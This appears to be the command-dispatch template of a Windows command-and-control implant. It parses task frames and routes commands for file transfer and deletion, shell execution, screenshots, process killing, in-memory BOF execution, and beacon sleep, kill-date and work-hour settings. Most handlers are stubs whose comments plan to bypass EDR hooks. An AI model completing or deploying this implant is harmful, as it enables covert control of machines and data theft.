// __NAME__ Agent — Commander Implementation
//
// Dispatches incoming commands to handler methods.
// Actual pack/unpack logic depends on the protocol overlay (which provides
// a Packer or equivalent serialization). This base template documents the
// expected parameter/response layout for each command.

#include "Commander.h"
#include "Agent.h"
#include "bof_loader.h"
#include "protocol.h"

static void DispatchTask(Commander* self, ULONG commandCode, ULONG cmdId, BYTE* data, ULONG dataSize)
{
    switch (commandCode) {
    case COMMAND_EXIT:               self->CmdTerminate(cmdId, data, dataSize); break;
    case COMMAND_FS_LIST:            self->CmdFsList(cmdId, data, dataSize); break;
    case COMMAND_FS_UPLOAD:          self->CmdFsUpload(cmdId, data, dataSize); break;
    case COMMAND_FS_DOWNLOAD:        self->CmdFsDownload(cmdId, data, dataSize); break;
    case COMMAND_FS_REMOVE:          self->CmdFsRemove(cmdId, data, dataSize); break;
    case COMMAND_FS_MKDIRS:          self->CmdFsMkdirs(cmdId, data, dataSize); break;
    case COMMAND_FS_COPY:            self->CmdFsCopy(cmdId, data, dataSize); break;
    case COMMAND_FS_MOVE:            self->CmdFsMove(cmdId, data, dataSize); break;
    case COMMAND_FS_CD:              self->CmdFsCd(cmdId, data, dataSize); break;
    case COMMAND_FS_PWD:             self->CmdFsPwd(cmdId, data, dataSize); break;
    case COMMAND_FS_CAT:             self->CmdFsCat(cmdId, data, dataSize); break;
    case COMMAND_OS_RUN:             self->CmdOsRun(cmdId, data, dataSize); break;
    case COMMAND_OS_INFO:            self->CmdOsInfo(cmdId, data, dataSize); break;
    case COMMAND_OS_PS:              self->CmdOsPs(cmdId, data, dataSize); break;
    case COMMAND_OS_SCREENSHOT:      self->CmdOsScreenshot(cmdId, data, dataSize); break;
    case COMMAND_OS_SHELL:           self->CmdOsShell(cmdId, data, dataSize); break;
    case COMMAND_OS_KILL:            self->CmdOsKill(cmdId, data, dataSize); break;
    case COMMAND_PROFILE_SLEEP:      self->CmdProfileSleep(cmdId, data, dataSize); break;
    case COMMAND_PROFILE_KILLDATE:   self->CmdProfileKilldate(cmdId, data, dataSize); break;
    case COMMAND_PROFILE_WORKTIME:   self->CmdProfileWorktime(cmdId, data, dataSize); break;
    case COMMAND_EXEC_BOF:
    case COMMAND_EXEC_BOF_ASYNC:     self->CmdExecBof(cmdId, data, dataSize); break;
    case COMMAND_JOB_LIST:           self->CmdJobList(cmdId, data, dataSize); break;
    case COMMAND_JOB_KILL:           self->CmdJobKill(cmdId, data, dataSize); break;
    default:                         break;
    }
}

Commander::Commander(Agent* a)
{
    this->agent = a;
}

Commander::~Commander()
{
}

void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, ULONG* outSize)
{
    // Protocol overlays normally replace this framing layer.
    // The base fallback uses the generic TaskHeader declared in protocol.h:
    //   [TaskHeader { commandId, dataSize }][payload][TaskHeader][payload]...
    // No per-task response framing is assumed here, so cmdId is passed as 0
    // and outBuf/outSize remain available for protocol-specific overrides.
    if (outSize) {
        *outSize = 0;
    }
    if (!recv || recvSize < sizeof(TaskHeader)) {
        return;
    }

    ULONG offset = 0;
    while (offset + sizeof(TaskHeader) <= recvSize) {
        TaskHeader header = {0};
        memcpy(&header, recv + offset, sizeof(TaskHeader));
        offset += sizeof(TaskHeader);

        if (header.dataSize > (recvSize - offset)) {
            break;
        }

        BYTE* data = recv + offset;
        offset += header.dataSize;

        DispatchTask(this, header.commandId, 0, data, header.dataSize);
    }

    (void)outBuf;
}

// ── Terminate ──────────────────────────────────────────────────────────────────

void Commander::CmdTerminate(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    (void)cmdId; (void)data; (void)dataSize;
    agent->active = FALSE;
}

// ── File system commands ───────────────────────────────────────────────────────

void Commander::CmdFsList(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: path (string)
    // Action: FindFirstFile/FindNextFile on path (or protocol-specific listing)
    // Response: RESP_FS_LIST { path (string), entries[] { name, is_dir, size, mod_time } }
    // TODO: Implement via evasion gate — FindFirstFile/FindNextFile are hooked by EDR.
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdFsUpload(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: path (string), file_data (bytes)
    // Action: CreateFile + WriteFile (path, data)
    // Response: RESP_FS_UPLOAD { path }
    // TODO: Implement via evasion gate — CreateFile/WriteFile may be hooked.
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdFsDownload(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: path (string)
    // Action: CreateFile + ReadFile, return content
    // Response: RESP_FS_DOWNLOAD { path, data (bytes) }
    // TODO: Implement via evasion gate — CreateFile/ReadFile may be hooked.
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdFsRemove(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: path (string)
    // Action: DeleteFile or RemoveDirectory (recursive)
    // Response: RESP_COMPLETE
    // TODO: Implement via evasion gate — DeleteFile may be hooked.
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdFsMkdirs(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: path (string)
    // Action: CreateDirectory (recursive)
    // Response: RESP_COMPLETE
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdFsCopy(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: src (string), dst (string)
    // Action: CopyFile or recursive directory copy
    // Response: RESP_COMPLETE
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdFsMove(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: src (string), dst (string)
    // Action: MoveFile
    // Response: RESP_COMPLETE
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdFsCd(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: path (string)
    // Action: SetCurrentDirectory
    // Response: RESP_COMPLETE
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdFsPwd(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: (none)
    // Action: GetCurrentDirectory
    // Response: RESP_FS_PWD { path }
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdFsCat(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: path (string)
    // Action: CreateFile + ReadFile, return as text
    // Response: RESP_FS_CAT { content (string) }
    (void)cmdId; (void)data; (void)dataSize;
}

// ── OS commands ────────────────────────────────────────────────────────────────

void Commander::CmdOsRun(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: command (string), output (bool), wait (bool)
    // Action: CreateProcess with optional pipe capture
    // Response: RESP_OS_RUN { output (string) }
    // TODO: Implement via evasion gate — CreateProcess is hooked by EDR.
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdOsInfo(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: (none)
    // Action: Gather hostname, username, domain, OS version, PID, etc.
    // Response: RESP_OS_INFO { hostname, username, domain, internal_ip,
    //           os, os_version, os_arch, elevated, process_id, process_name, code_page }
    // TODO: Implement via evasion gate — GetComputerName, GetUserName, etc. are hooked.
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdOsPs(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: (none)
    // Action: NtQuerySystemInformation or CreateToolhelp32Snapshot
    // Response: RESP_OS_PS { processes[] { pid, ppid, name, user, arch, session } }
    // TODO: Implement via evasion gate — process enumeration is heavily hooked.
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdOsScreenshot(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: (none)
    // Action: GDI BitBlt screen capture → PNG/BMP
    // Response: RESP_OS_SCREENSHOT { image (bytes) }
    // TODO: Implement via evasion gate — GDI calls may be monitored.
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdOsShell(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: command (string)
    // Action: CreateProcess("cmd.exe /c <command>"), pipe stdout/stderr
    // Response: RESP_OS_SHELL { output (string) }
    // TODO: Implement via evasion gate — cmd.exe spawning is hooked by EDR.
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdOsKill(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: pid (uint32)
    // Action: OpenProcess + TerminateProcess
    // Response: RESP_COMPLETE
    // TODO: Implement via evasion gate — OpenProcess/TerminateProcess are hooked.
    (void)cmdId; (void)data; (void)dataSize;
}

// ── Profile tuning ─────────────────────────────────────────────────────────────

void Commander::CmdProfileSleep(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: sleep (uint32, seconds), jitter (uint32, 0-90%)
    // Action: Update agent->sleepMs and agent->jitter
    // Response: RESP_COMPLETE
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdProfileKilldate(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: kill_date (int64, unix timestamp)
    // Action: Update agent->killDate
    // Response: RESP_COMPLETE
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdProfileWorktime(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: work_start (int32, HHMM), work_end (int32, HHMM)
    // Action: Update agent->workStart, agent->workEnd
    // Response: RESP_COMPLETE
    (void)cmdId; (void)data; (void)dataSize;
}

// ── BOF execution ──────────────────────────────────────────────────────────────

void Commander::CmdExecBof(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: object (bytes, .o file), argspack (string), task (string)
    //
    // Sync execution:
    //   BofContext* ctx = ObjectExecute(coffFile, coffLen,
    //                                  (unsigned char*)argsPack, (int)argsLen);
    //   for (int i = 0; i < ctx->msgCount; i++) {
    //       // ctx->msgs[i].type  — CALLBACK_OUTPUT, CALLBACK_ERROR, CALLBACK_AX_*, BOF_ERROR_*
    //       // ctx->msgs[i].data  — output blob
    //       // ctx->msgs[i].dataLen
    //   }
    //   BofContextFree(ctx);
    //
    // Async execution:
    //   Spawn thread, register as job, return start marker.
    //   Stream output via COMMAND_EXEC_BOF_OUT.
    //
    // Response: COMMAND_EXEC_BOF_OUT { msgs[] { type, data } }
    (void)cmdId; (void)data; (void)dataSize;
}

// ── Job management ─────────────────────────────────────────────────────────────

void Commander::CmdJobList(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: (none)
    // Action: Enumerate agent->jobs->List()
    // Response: RESP_COMPLETE { list[] { job_id, job_type } }
    (void)cmdId; (void)data; (void)dataSize;
}

void Commander::CmdJobKill(ULONG cmdId, BYTE* data, ULONG dataSize)
{
    // Unpack: job_id (uint32)
    // Action: agent->jobs->Kill(jobId)
    // Response: RESP_COMPLETE
    (void)cmdId; (void)data; (void)dataSize;
}
